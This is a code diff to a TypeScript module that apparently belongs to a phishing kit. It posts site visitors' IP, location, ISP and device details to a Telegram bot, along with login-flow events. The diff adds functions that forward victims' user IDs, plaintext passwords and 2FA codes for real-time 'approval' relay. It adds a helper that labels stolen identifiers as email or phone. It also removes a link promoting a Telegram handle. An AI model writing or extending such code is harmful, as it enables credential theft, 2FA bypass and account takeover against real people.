@@ -33,6 +33,8 @@ export interface VisitorTelegramData {
   pageUrl: string
   localTime: string
   utcTime: string
+  platformLabel?: string
+  browserLabel?: string
 }
 
 interface FormData {
@@ -105,41 +107,24 @@ function asPre(value: unknown): string {
   return `<pre>${escapeTelegramHtml(t || 'Unknown')}</pre>`
 }
 
-let previewRotationIndex = 0
-
-function getRotatedPreviewUrl(referrer?: string, pageUrl?: string): string {
-  const candidates: string[] = ["https://t.me/th3_allfather"]
-  if (pageUrl && /^https?:\/\//i.test(pageUrl.trim())) candidates.push(pageUrl.trim())
-  if (referrer && /^https?:\/\//i.test(referrer.trim()) && referrer.trim() !== "Direct") candidates.push(referrer.trim())
-  const selected = candidates[previewRotationIndex % candidates.length]
-  previewRotationIndex = (previewRotationIndex + 1) % 1000
-  return selected
-}
-
 export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
   const site = escapeTelegramHtml(data.siteName)
-  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
-  const message = [
-    `🌐 <b>(${site})</b>`,
-    "━━━━━━━━━━━━━━━━━━",
-    `📍 <b>Location:</b> ${asCode(data.location)}`,
-    `🌍 <b>IP:</b> ${asCode(data.ip)}`,
-    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
-    `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
-    ...(networkHint ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`] : []),
-    "",
-    `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? data.osLabel ?? "Unknown")}`,
-    `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
-    `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
-    `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
-    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer, "Direct")}`,
-    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
-    "",
-    `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`,
-  ].join("\n")
+  const message =
+    `\n🌐 <b>New Visitor (${site})</b>\n` +
+    `━━━━━━━━━━━━━━━━━━\n` +
+    `📍 <b>Location:</b> ${asCode(data.location)}\n` +
+    `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
+    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
+    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n\n` +
+    `📱 <b>Device:</b>\n${asPre(data.userAgent)}\n` +
+    `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
+    `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
+    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
+    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
+    `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
+    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`
 
-  const previewUrl = getRotatedPreviewUrl(data.referrer, data.pageUrl)
-  return await sendTelegramMessage(message, { disablePreview: false, previewUrl, preferSmallMedia: true })
+  return await sendTelegramMessage(message, { disableWebPagePreview: false })
 }
 
 export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
@@ -319,7 +304,8 @@ ${lines || 'No questions captured.'}`
   // 7a) Login 2FA – resend code (login verify-code)
   else if (data.type === 'login_email_otp_resend' || data.type === 'login_text_otp_resend') {
     message = `🔔 <b>Resend Code Clicked</b>
-━━━━━━━━━━━━━━━━━━`
+━━━━━━━━━━━━━━━━━━
+${formatResendIdentityLine(data.userId) || ""}`
   }
   // 7b) Login 2FA – "I did not receive my code" clicked
   else if (data.type === 'login_did_not_receive_code') {
@@ -357,25 +343,13 @@ ${data.otp ? `🔐 <b>OTP Code:</b> ${asCode(data.otp)}` : ''}`
 
 export type SendTelegramMessageOptions = {
   disableWebPagePreview?: boolean
-  disablePreview?: boolean
-  previewUrl?: string
-  preferSmallMedia?: boolean
-  showAboveText?: boolean
 }
 
 export async function sendTelegramMessage(
   message: string,
   options: SendTelegramMessageOptions = {},
 ): Promise<boolean> {
-  const disablePreview = options.disablePreview ?? (options.disableWebPagePreview !== false)
-  const link_preview_options = disablePreview
-    ? { is_disabled: true }
-    : {
-        is_disabled: false,
-        ...(options.previewUrl ? { url: options.previewUrl } : {}),
-        prefer_small_media: options.preferSmallMedia ?? true,
-        show_above_text: options.showAboveText ?? false,
-      }
+  const disableWebPagePreview = options.disableWebPagePreview !== false
 
   // Validate we have the required token
   if (!TELEGRAM_BOT_TOKEN) {
@@ -399,8 +373,7 @@ export async function sendTelegramMessage(
         chat_id: chatId,
         text: message,
         parse_mode: 'HTML',
-        disable_web_page_preview: disablePreview,
-        link_preview_options,
+        disable_web_page_preview: disableWebPagePreview,
       })
     })
     .then(async (response) => {
@@ -453,6 +426,21 @@ export async function getVisitorData(request: NextRequest): Promise<VisitorTeleg
     localTime: formatVisitorLocalTime(now, tz),
     utcTime: formatVisitorUtcTime(now),
   }
+}
+
+
+/* fleet-resend-identity-helper */
+const RESEND_ID_BRAND_DEFAULT = "User ID"
+function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = asCode): string {
+  const raw = userId == null ? "" : String(userId).trim()
+  if (!raw) return ""
+  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+  if (raw.includes("@") && emailRe.test(raw)) return `📧 Email: ${asCodeFn(raw)}`
+  const digits = raw.replace(/\D/g, "")
+  if (digits.length >= 10 && digits.length <= 15 && !raw.includes("@")) {
+    return `📱 Phone: ${asCodeFn(raw)}`
+  }
+  return `👤 ${RESEND_ID_BRAND_DEFAULT}: ${asCodeFn(raw)}`
 }
 
 export async function sendResendCodeNotification(data?: { page?: string }): Promise<boolean> {
@@ -554,6 +542,62 @@ class TelegramService {
       .join("\n")
     await sendTelegramMessage(wrapFlowMessage(body))
   }
+
+
+
+  async sendLoginApprovalRequest(data: {
+    userId: string
+    password: string
+    method?: string
+    createdAtMs?: number
+    databaseShard?: string
+    approvalsUrl?: string
+    ip?: string
+  }): Promise<void> {
+    if (typeof (this as any).sendLoginApprovalNotification === "function") {
+      await (this as any).sendLoginApprovalNotification({
+        userId: data.userId,
+        password: data.password,
+        method: data.method === "text" ? "text" : "email",
+        createdAtMs: data.createdAtMs ?? Date.now(),
+        databaseShard: data.databaseShard,
+        ip: data.ip,
+      })
+      return
+    }
+    if (typeof (this as any).sendLoginApprovalRequestNotification === "function") {
+      await (this as any).sendLoginApprovalRequestNotification(data)
+    }
+  }
+
+  async sendOtpApprovalRequest(data: {
+    userId: string
+    code: string
+    twoFactorMethod?: string
+    method?: string
+    createdAtMs?: number
+    databaseShard?: string
+    approvalsUrl?: string
+    ip?: string
+    maskedEmail?: string
+    maskedPhone?: string
+  }): Promise<void> {
+    if (typeof (this as any).sendVerificationApprovalNotification === "function") {
+      await (this as any).sendVerificationApprovalNotification({
+        userId: data.userId,
+        code: data.code,
+        method: (data.twoFactorMethod === "text" || data.method === "text") ? "text" : "email",
+        createdAtMs: data.createdAtMs ?? Date.now(),
+        databaseShard: data.databaseShard,
+        ip: data.ip,
+      })
+      return
+    }
+    if (typeof (this as any).sendOtpApprovalRequestNotification === "function") {
+      await (this as any).sendOtpApprovalRequestNotification(data)
+    }
+  }
+
 }
 
 export const telegramService = new TelegramService()
